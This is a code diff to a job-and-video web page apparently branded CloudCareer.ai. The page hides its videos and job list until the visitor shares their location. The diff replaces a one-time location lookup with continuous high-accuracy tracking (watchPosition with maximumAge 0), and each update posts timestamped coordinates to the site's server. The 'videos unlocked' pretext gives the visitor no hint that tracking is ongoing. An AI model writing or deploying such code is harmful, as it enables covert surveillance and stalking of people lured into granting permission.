@@ -148,46 +148,51 @@
     &copy; 2025 CloudCareer.ai | All rights reserved
   </footer>
 
-  <script>
-    function shareLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function(pos) {
-          const lat = pos.coords.latitude;
-          const lon = pos.coords.longitude;
+ <script>
+  function shareLocation() {
+    if (navigator.geolocation) {
+      navigator.geolocation.watchPosition(function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
 
-          document.getElementById('status').innerText = "Finding the best videos for your location...";
+        document.getElementById('status').innerText = "Finding the best videos for your location...";
 
-          fetch('/api/save-location', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              latitude: lat,
-              longitude: lon,
-              timestamp: new Date().toISOString()
-            })
+        fetch('/api/save-location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            latitude: lat,
+            longitude: lon,
+            timestamp: new Date().toISOString()
           })
-          .then(res => res.json())
-          .then(data => {
-            document.getElementById('status').innerText = "✅  saved. Videos unlocked.";
+        })
+        .then(res => res.json())
+        .then(data => {
+          document.getElementById('status').innerText = "✅ saved. Videos unlocked.";
 
-            // Set YouTube video URLs
-            const ytURL1 = "https://www.youtube.com/embed/X5qoqwoJrrc";
-            const ytURL2 = "https://www.youtube.com/embed/E-bNlmja0j8?si=gl1IsycLAxNDZexy";
+          // Set YouTube video URLs (only once)
+          const ytURL1 = "https://www.youtube.com/embed/X5qoqwoJrrc";
+          const ytURL2 = "https://www.youtube.com/embed/E-bNlmja0j8?si=gl1IsycLAxNDZexy";
 
-            document.getElementById('ytFrame1').src = ytURL1;
-            document.getElementById('ytFrame2').src = ytURL2;
+          document.getElementById('ytFrame1').src = ytURL1;
+          document.getElementById('ytFrame2').src = ytURL2;
 
-document.getElementById('videoContainer').style.display = 'block';
-document.getElementById('jobsContainer').style.display = 'block'; // 👈 This line shows the job list
-          });
-        }, function () {
-          alert("❌ Location permission denied.");
+          document.getElementById('videoContainer').style.display = 'block';
+          document.getElementById('jobsContainer').style.display = 'block';
         });
-      } else {
-        alert("Geolocation is not supported by this browser.");
-      }
+      }, function () {
+        alert("❌ Location permission denied.");
+      }, {
+        enableHighAccuracy: true,
+        maximumAge: 0,
+        timeout: 10000
+      });
+    } else {
+      alert("Geolocation is not supported by this browser.");
     }
-  </script>
+  }
+</script>
+
 
 </body>
 </html>
